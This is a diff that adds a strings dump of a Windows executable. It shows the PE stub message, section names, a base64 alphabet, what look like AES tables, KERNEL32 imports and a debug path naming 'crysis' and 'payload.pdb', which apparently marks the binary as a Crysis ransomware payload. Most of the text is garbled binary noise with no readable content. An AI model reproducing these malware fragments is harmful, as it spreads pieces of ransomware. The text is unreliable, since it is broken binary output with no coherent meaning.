@@ -1,0 +1,137 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@
+@@@@@@
+ !"#$%&'()*+,-./0123@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+=j&&LZ66lA??~
+}{))R>
+f""D~**T
+V22dN::t
+o%%Jr..\$
+&&Lj66lZ??~A
+99rKJJ
+==zGdd
+""Df**T~
+;22dV::tN
+$$Hl\\
+C77nYmm
+%%Jo..\r
+>!KK
+55j_WW
+&Lj&6lZ6?~A?
+~=zG=d
+"Df"*T~*
+2dV2:tN:
+x%Jo%.\r.
+t>!K
+a5j_5W
+ggV}++
+Lj&&lZ66~A??
+bS11*?
+Xt,,4.
+RRvM;;
+MMfU33
+PPxD<<%
+Bc!! 0
+~~zG==
+Df""T~**;
+dV22tN::
+xxJo%%\r..8$
+tt>!
+pp|B>>q
+aaj_55
+UUPx((
+='9-6d
+_jbF~T
+11#?*0
+,4$8_@
+t\lHBW
+QPeA~S
+>4$8,@
+p\lHtW
++HpXhE
+T[$:.6
+GetProcAddress
+LoadLibraryA
+WaitForSingleObject
+InitializeCriticalSectionAndSpinCount
+LeaveCriticalSection
+GetLastError
+EnterCriticalSection
+ReleaseMutex
+CloseHandle
+KERNEL32.dll
+RSDS%~m
+C:\crysis\Release\PDB\payload.pdb
+`L|OV+
+q!`'B@RN3u
+qp!!Wn
+d]U)#W
+Ke%P!{[
+*.V5-3<
+=qr_zQ.
+GB]nUqr
+\0C0<'
+6Km|mp^
+]}hFPo
+7'?Bgx
+9v^S<S
+y1js'x
+;>`tBS
+bRf9r'
+cZP?Ib
+aJ :]|n
+]qSldw
+w\tU0W:M
+pP."m
+(XfhW9~
+!CS=p+
+^ CzC[yEV
+:`X78*
+zi(j~;2
+t)klAA4,
+cOfIoy
+e>4;-q
+s'k -]
+&ad>fk[S9|
+Q;"K(M
+qaNQy}.{
+?0E0;Xa
+6!Cw59
+Qfi7)'
+)ut@op
+egmr s
+~!uZt~E
+$&^VM!
+"[jjI83
+!M[2dF!G;
+b>(Z]ZH
+m.bSzq
+<g#@z.
+&3p+zd4
+3m b,q
+!hJu?ru
+C>r-}t!b
+\LxVe{
+)F}Nn!
+G2c}Uc.
+T)&B;,L*
+:9c3D?
+?=z\Cu
+$V#9.Q
+SHEtv}F
+3y}Z"i
+fENS8_7n
+(h(+)T
+K9Wa/j
+:i\60XX
+l Q" $&
+QkPWio
+1L$}XxM
+%Dl70D
+sssssbsss
+sssssbs
+Qkkbal
+0123456789ABCDEF
+0123456789ABCDEF
